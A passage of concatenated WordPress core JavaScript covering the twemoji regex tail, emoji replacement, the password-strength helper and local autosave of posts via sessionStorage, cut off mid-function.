d83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffc-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffc-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffd-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb\udffd-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffc\udffe\udfff]|\ud83d\udc69\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb\udffc\udffe\udfff]|\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffd\udfff]|\ud83d\udc69\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb-\udffd\udfff]|\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffe]|\ud83d\udc69\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb-\udffe]|\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffc-\udfff]|\ud83e\uddd1\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffb\udffd-\udfff]|\ud83e\uddd1\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffb\udffc\udffe\udfff]|\ud83e\uddd1\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffb-\udffd\udfff]|\ud83e\uddd1\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffb-\udffe]|\ud83e\uddd1\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83d\udc68\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68|\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d[\udc68\udc69]|\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c[\udffc-\udfff]|\ud83e\udef1\ud83c\udffc\u200d\ud83e\udef2\ud83c[\udffb\udffd-\udfff]|\ud83e\udef1\ud83c\udffd\u200d\ud83e\udef2\ud83c[\udffb\udffc\udffe\udfff]|\ud83e\udef1\ud83c\udffe\u200d\ud83e\udef2\ud83c[\udffb-\udffd\udfff]|\ud83e\udef1\ud83c\udfff\u200d\ud83e\udef2\ud83c[\udffb-\udffe]|\ud83d\udc68\u200d\u2764\ufe0f\u200d\ud83d\udc68|\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d[\udc68\udc69]|\ud83e\uddd1\u200d\ud83e\udd1d\u200d\ud83e\uddd1|\ud83d\udc6b\ud83c[\udffb-\udfff]|\ud83d\udc6c\ud83c[\udffb-\udfff]|\ud83d\udc6d\ud83c[\udffb-\udfff]|\ud83d\udc8f\ud83c[\udffb-\udfff]|\ud83d\udc91\ud83c[\udffb-\udfff]|\ud83e\udd1d\ud83c[\udffb-\udfff]|\ud83d[\udc6b-\udc6d\udc8f\udc91]|\ud83e\udd1d)|(?:\ud83d[\udc68\udc69]|\ud83e\uddd1)(?:\ud83c[\udffb-\udfff])?\u200d(?:\u2695\ufe0f|\u2696\ufe0f|\u2708\ufe0f|\ud83c[\udf3e\udf73\udf7c\udf84\udf93\udfa4\udfa8\udfeb\udfed]|\ud83d[\udcbb\udcbc\udd27\udd2c\ude80\ude92]|\ud83e[\uddaf-\uddb3\uddbc\uddbd])|(?:\ud83c[\udfcb\udfcc]|\ud83d[\udd74\udd75]|\u26f9)((?:\ud83c[\udffb-\udfff]|\ufe0f)\u200d[\u2640\u2642]\ufe0f)|(?:\ud83c[\udfc3\udfc4\udfca]|\ud83d[\udc6e\udc70\udc71\udc73\udc77\udc81\udc82\udc86\udc87\ude45-\ude47\ude4b\ude4d\ude4e\udea3\udeb4-\udeb6]|\ud83e[\udd26\udd35\udd37-\udd39\udd3d\udd3e\uddb8\uddb9\uddcd-\uddcf\uddd4\uddd6-\udddd])(?:\ud83c[\udffb-\udfff])?\u200d[\u2640\u2642]\ufe0f|(?:\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d[\udc66\udc67]|\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f|\ud83c\udff3\ufe0f\u200d\ud83c\udf08|\ud83d\ude36\u200d\ud83c\udf2b\ufe0f|\u2764\ufe0f\u200d\ud83d\udd25|\u2764\ufe0f\u200d\ud83e\ude79|\ud83c\udff4\u200d\u2620\ufe0f|\ud83d\udc15\u200d\ud83e\uddba|\ud83d\udc3b\u200d\u2744\ufe0f|\ud83d\udc41\u200d\ud83d\udde8|\ud83d\udc68\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\ud83d[\udc66\udc67]|\ud83d\udc6f\u200d\u2640\ufe0f|\ud83d\udc6f\u200d\u2642\ufe0f|\ud83d\ude2e\u200d\ud83d\udca8|\ud83d\ude35\u200d\ud83d\udcab|\ud83e\udd3c\u200d\u2640\ufe0f|\ud83e\udd3c\u200d\u2642\ufe0f|\ud83e\uddde\u200d\u2640\ufe0f|\ud83e\uddde\u200d\u2642\ufe0f|\ud83e\udddf\u200d\u2640\ufe0f|\ud83e\udddf\u200d\u2642\ufe0f|\ud83d\udc08\u200d\u2b1b|\ud83d\udc26\u200d\u2b1b)|[#*0-9]\ufe0f?\u20e3|(?:[\xa9\xae\u2122\u265f]\ufe0f)|(?:\ud83c[\udc04\udd70\udd71\udd7e\udd7f\ude02\ude1a\ude2f\ude37\udf21\udf24-\udf2c\udf36\udf7d\udf96\udf97\udf99-\udf9b\udf9e\udf9f\udfcd\udfce\udfd4-\udfdf\udff3\udff5\udff7]|\ud83d[\udc3f\udc41\udcfd\udd49\udd4a\udd6f\udd70\udd73\udd76-\udd79\udd87\udd8a-\udd8d\udda5\udda8\uddb1\uddb2\uddbc\uddc2-\uddc4\uddd1-\uddd3\udddc-\uddde\udde1\udde3\udde8\uddef\uddf3\uddfa\udecb\udecd-\udecf\udee0-\udee5\udee9\udef0\udef3]|[\u203c\u2049\u2139\u2194-\u2199\u21a9\u21aa\u231a\u231b\u2328\u23cf\u23ed-\u23ef\u23f1\u23f2\u23f8-\u23fa\u24c2\u25aa\u25ab\u25b6\u25c0\u25fb-\u25fe\u2600-\u2604\u260e\u2611\u2614\u2615\u2618\u2620\u2622\u2623\u2626\u262a\u262e\u262f\u2638-\u263a\u2640\u2642\u2648-\u2653\u2660\u2663\u2665\u2666\u2668\u267b\u267f\u2692-\u2697\u2699\u269b\u269c\u26a0\u26a1\u26a7\u26aa\u26ab\u26b0\u26b1\u26bd\u26be\u26c4\u26c5\u26c8\u26cf\u26d1\u26d3\u26d4\u26e9\u26ea\u26f0-\u26f5\u26f8\u26fa\u26fd\u2702\u2708\u2709\u270f\u2712\u2714\u2716\u271d\u2721\u2733\u2734\u2744\u2747\u2757\u2763\u2764\u27a1\u2934\u2935\u2b05-\u2b07\u2b1b\u2b1c\u2b50\u2b55\u3030\u303d\u3297\u3299])(?:\ufe0f|(?!\ufe0e))|(?:(?:\ud83c[\udfcb\udfcc]|\ud83d[\udd74\udd75\udd90]|\ud83e\udef0|[\u261d\u26f7\u26f9\u270c\u270d])(?:\ufe0f|(?!\ufe0e))|(?:\ud83c[\udf85\udfc2-\udfc4\udfc7\udfca]|\ud83d[\udc42\udc43\udc46-\udc50\udc66-\udc69\udc6e\udc70-\udc78\udc7c\udc81-\udc83\udc85-\udc87\udcaa\udd7a\udd95\udd96\ude45-\ude47\ude4b-\ude4f\udea3\udeb4-\udeb6\udec0\udecc]|\ud83e[\udd0c\udd0f\udd18-\udd1c\udd1e\udd1f\udd26\udd30-\udd39\udd3d\udd3e\udd77\uddb5\uddb6\uddb8\uddb9\uddbb\uddcd-\uddcf\uddd1-\udddd\udec3-\udec5\udef1-\udef8]|[\u270a\u270b]))(?:\ud83c[\udffb-\udfff])?|(?:\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f|\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc73\udb40\udc63\udb40\udc74\udb40\udc7f|\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc77\udb40\udc6c\udb40\udc73\udb40\udc7f|\ud83c\udde6\ud83c[\udde8-\uddec\uddee\uddf1\uddf2\uddf4\uddf6-\uddfa\uddfc\uddfd\uddff]|\ud83c\udde7\ud83c[\udde6\udde7\udde9-\uddef\uddf1-\uddf4\uddf6-\uddf9\uddfb\uddfc\uddfe\uddff]|\ud83c\udde8\ud83c[\udde6\udde8\udde9\uddeb-\uddee\uddf0-\uddf5\uddf7\uddfa-\uddff]|\ud83c\udde9\ud83c[\uddea\uddec\uddef\uddf0\uddf2\uddf4\uddff]|\ud83c\uddea\ud83c[\udde6\udde8\uddea\uddec\udded\uddf7-\uddfa]|\ud83c\uddeb\ud83c[\uddee-\uddf0\uddf2\uddf4\uddf7]|\ud83c\uddec\ud83c[\udde6\udde7\udde9-\uddee\uddf1-\uddf3\uddf5-\uddfa\uddfc\uddfe]|\ud83c\udded\ud83c[\uddf0\uddf2\uddf3\uddf7\uddf9\uddfa]|\ud83c\uddee\ud83c[\udde8-\uddea\uddf1-\uddf4\uddf6-\uddf9]|\ud83c\uddef\ud83c[\uddea\uddf2\uddf4\uddf5]|\ud83c\uddf0\ud83c[\uddea\uddec-\uddee\uddf2\uddf3\uddf5\uddf7\uddfc\uddfe\uddff]|\ud83c\uddf1\ud83c[\udde6-\udde8\uddee\uddf0\uddf7-\uddfb\uddfe]|\ud83c\uddf2\ud83c[\udde6\udde8-\udded\uddf0-\uddff]|\ud83c\uddf3\ud83c[\udde6\udde8\uddea-\uddec\uddee\uddf1\uddf4\uddf5\uddf7\uddfa\uddff]|\ud83c\uddf4\ud83c\uddf2|\ud83c\uddf5\ud83c[\udde6\uddea-\udded\uddf0-\uddf3\uddf7-\uddf9\uddfc\uddfe]|\ud83c\uddf6\ud83c\udde6|\ud83c\uddf7\ud83c[\uddea\uddf4\uddf8\uddfa\uddfc]|\ud83c\uddf8\ud83c[\udde6-\uddea\uddec-\uddf4\uddf7-\uddf9\uddfb\uddfd-\uddff]|\ud83c\uddf9\ud83c[\udde6\udde8\udde9\uddeb-\udded\uddef-\uddf4\uddf7\uddf9\uddfb\uddfc\uddff]|\ud83c\uddfa\ud83c[\udde6\uddec\uddf2\uddf3\uddf8\uddfe\uddff]|\ud83c\uddfb\ud83c[\udde6\udde8\uddea\uddec\uddee\uddf3\uddfa]|\ud83c\uddfc\ud83c[\uddeb\uddf8]|\ud83c\uddfd\ud83c\uddf0|\ud83c\uddfe\ud83c[\uddea\uddf9]|\ud83c\uddff\ud83c[\udde6\uddf2\uddfc]|\ud83c[\udccf\udd8e\udd91-\udd9a\udde6-\uddff\ude01\ude32-\ude36\ude38-\ude3a\ude50\ude51\udf00-\udf20\udf2d-\udf35\udf37-\udf7c\udf7e-\udf84\udf86-\udf93\udfa0-\udfc1\udfc5\udfc6\udfc8\udfc9\udfcf-\udfd3\udfe0-\udff0\udff4\udff8-\udfff]|\ud83d[\udc00-\udc3e\udc40\udc44\udc45\udc51-\udc65\udc6a\udc6f\udc79-\udc7b\udc7d-\udc80\udc84\udc88-\udc8e\udc90\udc92-\udca9\udcab-\udcfc\udcff-\udd3d\udd4b-\udd4e\udd50-\udd67\udda4\uddfb-\ude44\ude48-\ude4a\ude80-\udea2\udea4-\udeb3\udeb7-\udebf\udec1-\udec5\uded0-\uded2\uded5-\uded7\udedc-\udedf\udeeb\udeec\udef4-\udefc\udfe0-\udfeb\udff0]|\ud83e[\udd0d\udd0e\udd10-\udd17\udd20-\udd25\udd27-\udd2f\udd3a\udd3c\udd3f-\udd45\udd47-\udd76\udd78-\uddb4\uddb7\uddba\uddbc-\uddcc\uddd0\uddde-\uddff\ude70-\ude7c\ude80-\ude88\ude90-\udebd\udebf-\udec2\udece-\udedb\udee0-\udee8]|[\u23e9-\u23ec\u23f0\u23f3\u267e\u26ce\u2705\u2728\u274c\u274e\u2753-\u2755\u2795-\u2797\u27b0\u27bf\ue50a])|\ufe0f/g,
        f = /\uFE0F/g,
        c = String.fromCharCode(8205),
        t = /[&<>'"]/g,
        m = /^(?:iframe|noframes|noscript|script|select|style|textarea)$/,
        e = String.fromCharCode;
    return h;

    function x(d, u) {
        return document.createTextNode(u ? d.replace(f, "") : d)
    }

    function b(d, u) {
        return "".concat(u.base, u.size, "/", d, u.ext)
    }

    function N(d) {
        return o(d.indexOf(c) < 0 ? d.replace(f, "") : d)
    }

    function r(d) {
        return u[d]
    }

    function a() {
        return null
    }

    function n(d, u) {
        return String(d).replace(g, u)
    }

    function o(d, u) {
        for (var f = [], c = 0, e = 0, b = 0; b < d.length;) c = d.charCodeAt(b++), e ? (f.push((65536 + (e - 55296 << 10) + (c - 56320)).toString(16)), e = 0) : 55296 <= c && c <= 56319 ? e = c : f.push(c.toString(16));
        return f.join(u || "-")
    }
}();
// Source: wp-includes/js/wp-emoji.min.js
! function(c, l) {
    c.wp = c.wp || {}, c.wp.emoji = new function() {
        var n, u, e = c.MutationObserver || c.WebKitMutationObserver || c.MozMutationObserver,
            a = c.document,
            t = !1,
            r = 0,
            o = 0 < c.navigator.userAgent.indexOf("Trident/7.0");

        function i() {
            return !a.implementation.hasFeature || a.implementation.hasFeature("http://www.w3.org/TR/SVG11/feature#Image", "1.1")
        }

        function s() {
            if (!t) {
                if (void 0 === c.twemoji) return 600 < r ? void 0 : (c.clearTimeout(u), u = c.setTimeout(s, 50), void r++);
                n = c.twemoji, t = !0, e && new e(function(u) {
                    for (var e, t, n, a, r = u.length; r--;) {
                        if (e = u[r].addedNodes, t = u[r].removedNodes, 1 === (n = e.length) && 1 === t.length && 3 === e[0].nodeType && "IMG" === t[0].nodeName && e[0].data === t[0].alt && "load-failed" === t[0].getAttribute("data-error")) return;
                        for (; n--;) {
                            if (3 === (a = e[n]).nodeType) {
                                if (!a.parentNode) continue;
                                if (o)
                                    for (; a.nextSibling && 3 === a.nextSibling.nodeType;) a.nodeValue = a.nodeValue + a.nextSibling.nodeValue, a.parentNode.removeChild(a.nextSibling);
                                a = a.parentNode
                            }
                            d(a.textContent) && f(a)
                        }
                    }
                }).observe(a.body, {
                    childList: !0,
                    subtree: !0
                }), f(a.body)
            }
        }

        function d(u) {
            return !!u && (/[\uDC00-\uDFFF]/.test(u) || /[\u203C\u2049\u20E3\u2122\u2139\u2194-\u2199\u21A9\u21AA\u2300\u231A\u231B\u2328\u2388\u23CF\u23E9-\u23F3\u23F8-\u23FA\u24C2\u25AA\u25AB\u25B6\u25C0\u25FB-\u25FE\u2600-\u2604\u260E\u2611\u2614\u2615\u2618\u261D\u2620\u2622\u2623\u2626\u262A\u262E\u262F\u2638\u2639\u263A\u2648-\u2653\u2660\u2663\u2665\u2666\u2668\u267B\u267F\u2692\u2693\u2694\u2696\u2697\u2699\u269B\u269C\u26A0\u26A1\u26AA\u26AB\u26B0\u26B1\u26BD\u26BE\u26C4\u26C5\u26C8\u26CE\u26CF\u26D1\u26D3\u26D4\u26E9\u26EA\u26F0-\u26F5\u26F7-\u26FA\u26FD\u2702\u2705\u2708-\u270D\u270F\u2712\u2714\u2716\u271D\u2721\u2728\u2733\u2734\u2744\u2747\u274C\u274E\u2753\u2754\u2755\u2757\u2763\u2764\u2795\u2796\u2797\u27A1\u27B0\u27BF\u2934\u2935\u2B05\u2B06\u2B07\u2B1B\u2B1C\u2B50\u2B55\u3030\u303D\u3297\u3299]/.test(u))
        }

        function f(u, e) {
            var t;
            return !l.supports.everything && n && u && ("string" == typeof u || u.childNodes && u.childNodes.length) ? (e = e || {}, t = {
                base: i() ? l.svgUrl : l.baseUrl,
                ext: i() ? l.svgExt : l.ext,
                className: e.className || "emoji",
                callback: function(u, e) {
                    switch (u) {
                        case "a9":
                        case "ae":
                        case "2122":
                        case "2194":
                        case "2660":
                        case "2663":
                        case "2665":
                        case "2666":
                            return !1
                    }
                    return !(l.supports.everythingExceptFlag && !/^1f1(?:e[6-9a-f]|f[0-9a-f])-1f1(?:e[6-9a-f]|f[0-9a-f])$/.test(u) && !/^(1f3f3-fe0f-200d-1f308|1f3f4-200d-2620-fe0f)$/.test(u)) && "".concat(e.base, u, e.ext)
                },
                attributes: function() {
                    return {
                        role: "img"
                    }
                },
                onerror: function() {
                    n.parentNode && (this.setAttribute("data-error", "load-failed"), n.parentNode.replaceChild(a.createTextNode(n.alt), n))
                },
                doNotParse: function(u) {
                    return !(!u || !u.className || "string" != typeof u.className || -1 === u.className.indexOf("wp-exclude-emoji"))
                }
            }, "object" == typeof e.imgAttr && (t.attributes = function() {
                return e.imgAttr
            }), n.parse(u, t)) : u
        }
        return l && (l.DOMReady ? s() : l.readyCallback = s), {
            parse: f,
            test: d
        }
    }
}(window, window._wpemojiSettings);
window.wp = window.wp || {},
    function(a) {
        var e = wp.i18n.__,
            n = wp.i18n.sprintf;
        wp.passwordStrength = {
            meter: function(e, n, t) {
                return Array.isArray(n) || (n = [n.toString()]), e != t && t && 0 < t.length ? 5 : void 0 === window.zxcvbn ? -1 : zxcvbn(e, n).score
            },
            userInputBlacklist: function() {
                return window.console.log(n(e("%1$s is deprecated since version %2$s! Use %3$s instead. Please consider writing more inclusive code."), "wp.passwordStrength.userInputBlacklist()", "5.5.0", "wp.passwordStrength.userInputDisallowedList()")), wp.passwordStrength.userInputDisallowedList()
            },
            userInputDisallowedList: function() {
                var e, n, t, r, s = [],
                    i = [],
                    o = ["user_login", "first_name", "last_name", "nickname", "display_name", "email", "url", "description", "weblog_title", "admin_email"];
                for (s.push(document.title), s.push(document.URL), n = o.length, e = 0; e < n; e++) 0 !== (r = a("#" + o[e])).length && (s.push(r[0].defaultValue), s.push(r.val()));
                for (t = s.length, e = 0; e < t; e++) s[e] && (i = i.concat(s[e].replace(/\W/g, " ").split(" ")));
                return i = a.grep(i, function(e, n) {
                    return !("" === e || e.length < 4) && a.inArray(e, i) === n
                })
            }
        }, window.passwordStrength = wp.passwordStrength.meter
    }(jQuery);


/**
 * @output wp-includes/js/autosave.js
 */

/* global tinymce, wpCookies, autosaveL10n, switchEditors */
// Back-compat.
window.autosave = function() {
	return true;
};

/**
 * Adds autosave to the window object on dom ready.
 *
 * @since 3.9.0
 *
 * @param {jQuery} $ jQuery object.
 * @param {window} The window object.
 *
 */
( function( $, window ) {
	/**
	 * Auto saves the post.
	 *
	 * @since 3.9.0
	 *
	 * @return {Object}
	 * 	{{
	 * 		getPostData: getPostData,
	 * 		getCompareString: getCompareString,
	 * 		disableButtons: disableButtons,
	 * 		enableButtons: enableButtons,
	 * 		local: ({hasStorage, getSavedPostData, save, suspend, resume}|*),
	 * 		server: ({tempBlockSave, triggerSave, postChanged, suspend, resume}|*)
	 * 	}}
	 * 	The object with all functions for autosave.
	 */
	function autosave() {
		var initialCompareString,
			initialCompareData = {},
			lastTriggerSave    = 0,
			$document          = $( document );

		/**
		 * Sets the initial compare data.
		 *
		 * @since 5.6.1
		 */
		function setInitialCompare() {
			initialCompareData = {
				post_title: $( '#title' ).val() || '',
				content: $( '#content' ).val() || '',
				excerpt: $( '#excerpt' ).val() || ''
			};

			initialCompareString = getCompareString( initialCompareData );
		}

		/**
		 * Returns the data saved in both local and remote autosave.
		 *
		 * @since 3.9.0
		 *
		 * @param {string} type The type of autosave either local or remote.
		 *
		 * @return {Object} Object containing the post data.
		 */
		function getPostData( type ) {
			var post_name, parent_id, data,
				time = ( new Date() ).getTime(),
				cats = [],
				editor = getEditor();

			// Don't run editor.save() more often than every 3 seconds.
			// It is resource intensive and might slow down typing in long posts on slow devices.
			if ( editor && editor.isDirty() && ! editor.isHidden() && time - 3000 > lastTriggerSave ) {
				editor.save();
				lastTriggerSave = time;
			}

			data = {
				post_id: $( '#post_ID' ).val() || 0,
				post_type: $( '#post_type' ).val() || '',
				post_author: $( '#post_author' ).val() || '',
				post_title: $( '#title' ).val() || '',
				content: $( '#content' ).val() || '',
				excerpt: $( '#excerpt' ).val() || ''
			};

			if ( type === 'local' ) {
				return data;
			}

			$( 'input[id^="in-category-"]:checked' ).each( function() {
				cats.push( this.value );
			});
			data.catslist = cats.join(',');

			if ( post_name = $( '#post_name' ).val() ) {
				data.post_name = post_name;
			}

			if ( parent_id = $( '#parent_id' ).val() ) {
				data.parent_id = parent_id;
			}

			if ( $( '#comment_status' ).prop( 'checked' ) ) {
				data.comment_status = 'open';
			}

			if ( $( '#ping_status' ).prop( 'checked' ) ) {
				data.ping_status = 'open';
			}

			if ( $( '#auto_draft' ).val() === '1' ) {
				data.auto_draft = '1';
			}

			return data;
		}

		/**
		 * Concatenates the title, content and excerpt. This is used to track changes
		 * when auto-saving.
		 *
		 * @since 3.9.0
		 *
		 * @param {Object} postData The object containing the post data.
		 *
		 * @return {string} A concatenated string with title, content and excerpt.
		 */
		function getCompareString( postData ) {
			if ( typeof postData === 'object' ) {
				return ( postData.post_title || '' ) + '::' + ( postData.content || '' ) + '::' + ( postData.excerpt || '' );
			}

			return ( $('#title').val() || '' ) + '::' + ( $('#content').val() || '' ) + '::' + ( $('#excerpt').val() || '' );
		}

		/**
		 * Disables save buttons.
		 *
		 * @since 3.9.0
		 *
		 * @return {void}
		 */
		function disableButtons() {
			$document.trigger('autosave-disable-buttons');

			// Re-enable 5 sec later. Just gives autosave a head start to avoid collisions.
			setTimeout( enableButtons, 5000 );
		}

		/**
		 * Enables save buttons.
		 *
		 * @since 3.9.0
		 *
		 * @return {void}
		 */
		function enableButtons() {
			$document.trigger( 'autosave-enable-buttons' );
		}

		/**
		 * Gets the content editor.
		 *
		 * @since 4.6.0
		 *
		 * @return {boolean|*} Returns either false if the editor is undefined,
		 *                     or the instance of the content editor.
		 */
		function getEditor() {
			return typeof tinymce !== 'undefined' && tinymce.get('content');
		}

		/**
		 * Autosave in localStorage.
		 *
		 * @since 3.9.0
		 *
		 * @return {
		 * {
		 * 	hasStorage: *,
		 * 	getSavedPostData: getSavedPostData,
		 * 	save: save,
		 * 	suspend: suspend,
		 * 	resume: resume
		 * 	}
		 * }
		 * The object with all functions for local storage autosave.
		 */
		function autosaveLocal() {
			var blog_id, post_id, hasStorage, intervalTimer,
				lastCompareString,
				isSuspended = false;

			/**
			 * Checks if the browser supports sessionStorage and it's not disabled.
			 *
			 * @since 3.9.0
			 *
			 * @return {boolean} True if the sessionStorage is supported and enabled.
			 */
			function checkStorage() {
				var test = Math.random().toString(),
					result = false;

				try {
					window.sessionStorage.setItem( 'wp-test', test );
					result = window.sessionStorage.getItem( 'wp-test' ) === test;
					window.sessionStorage.removeItem( 'wp-test' );
				} catch(e) {}

				hasStorage = result;
				return result;
			}

			/**
			 * Initializes the local storage.
			 *
			 * @since 3.9.0
			 *
			 * @return {boolean|Object} False if no sessionStorage in the browser or an Object
			 *                          containing all postData for this blog.
			 */
			function getStorage() {
				var stored_obj = false;
				// Separate local storage containers for each blog_id.
				if ( hasStorage && blog_id ) {
					stored_obj = sessionStorage.getItem( 'wp-autosave-' + blog_id );

					if ( stored_obj ) {
						stored_obj = JSON.parse( stored_obj );
					} else {
						stored_obj = {};
					}
				}

				return stored_obj;
			}

			/**
			 * Sets the storage for this blog. Confirms that the data was saved
			 * successfully.
			 *
			 * @since 3.9.0
			 *
			 * @return {boolean} True if the data was saved successfully, false if it wasn't saved.
			 */
			function setStorage( stored_obj ) {
				var key;

				if ( hasStorage && blog_id ) {
					key = 'wp-autosave-' + blog_id;
					sessionStorage.setItem( key, JSON.stringify( stored_obj ) );
					return sessionStorage.getItem( key ) !== null;
				}

				return false;
			}

			/**
			 * Gets the saved post data for the current post.
			 *
			 * @since 3.9.0
			 *
			 * @return {boolean|Object} False if no storage or no data or the postData as an Object.
			 */
			function getSavedPostData() {
				var stored = getStorage();

				if ( ! stored || ! post_id ) {
					return false;
				}

				return stored[ 'post_' + post_id ] || false;
			}

			/**
			 * Sets (save or delete) post data in the storage.
			 *
			 * If stored_data evaluates to 'false' the storage key for the current post will be removed.
			 *
			 * @since 3.9.0
			 *
			 * @param {Object|boolean|null} stored_data The post data to store or null/false/empty to delete the key.
			 *
			 * @return {boolean} True if data is stored, false if data was removed.
			 */
			function setData( stored_data ) {
				var stored = getStorage();

				if ( ! stored || ! post_id ) {
					return false;
				}

				if ( stored_data ) {
					stored[ 'post_' + post_id ] = stored_data;
				} else if ( stored.hasOwnProperty( 'post_' + post_id ) ) {
					delete stored[ 'post_' + post_id ];
				} else {
					return false;
				}

				return setStorage( stored );
			}

			/**
			 * Sets isSuspended to true.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function suspend() {
				isSuspended = true;
			}

			/**
			 * Sets isSuspended to false.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function resume() {
				isSuspended = false;
			}

			/**
			 * Saves post data for the current post.
			 *
			 * Runs on a 15 seconds interval, saves when there are differences in the post title or content.
			 * When the optional data is provided, updates the last saved post data.
			 *
			 * @since 3.9.0
			 *
			 * @param {Object} data The post data for saving, minimum 'post_title' and 'content'.
			 *
			 * @return {boolean} Returns true when data has been saved, otherwise it returns false.
			 */
			function save( data ) {
				var postData, compareString,
					result = false;

				if ( isSuspended || ! hasStorage ) {
					return false;
				}

				if ( data ) {
					postData = getSavedPostData() || {};
					$.extend( postData, data );
				} else {
					postData = getPostData('local');
				}

				compareString = getCompareString( postData );

				if ( typeof lastCompareString === 'undefined' ) {
					lastCompareString = initialCompareString;
				}

				// If the content, title and excerpt did not change since the last save, don't save again.
				if ( compareString === lastCompareString ) {
					return false;
				}

				postData.save_time = ( new Date() ).getTime();
				postData.status = $( '#post_status' ).val() || '';
				result = setData( postData );

				if ( result ) {
					lastCompareString = compareString;
				}

				return result;
			}

			/**
			 * Initializes the auto save function.
			 *
			 * Checks whether the editor is active or not to use the editor events
			 * to autosave, or uses the values from the elements to autosave.
			 *
			 * Runs on DOM ready.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function run() {
				post_id = $('#post_ID').val() || 0;

				// Check if the local post data is different than the loaded post data.
				if ( $( '#wp-content-wrap' ).hasClass( 'tmce-active' ) ) {

					/*
					 * If TinyMCE loads first, check the post 1.5 seconds after it is ready.
					 * By this time the content has been loaded in the editor and 'saved' to the textarea.
					 * This prevents false positives.
					 */
					$document.on( 'tinymce-editor-init.autosave', function() {
						window.setTimeout( function() {
							checkPost();
						}, 1500 );
					});
				} else {
					checkPost();
				}

				// Save every 15 seconds.
				intervalTimer = window.setInterval( save, 15000 );

				$( 'form#post' ).on( 'submit.autosave-local', function() {
					var editor = getEditor(),
						post_id = $('#post_ID').val() || 0;

					if ( editor && ! editor.isHidden() ) {

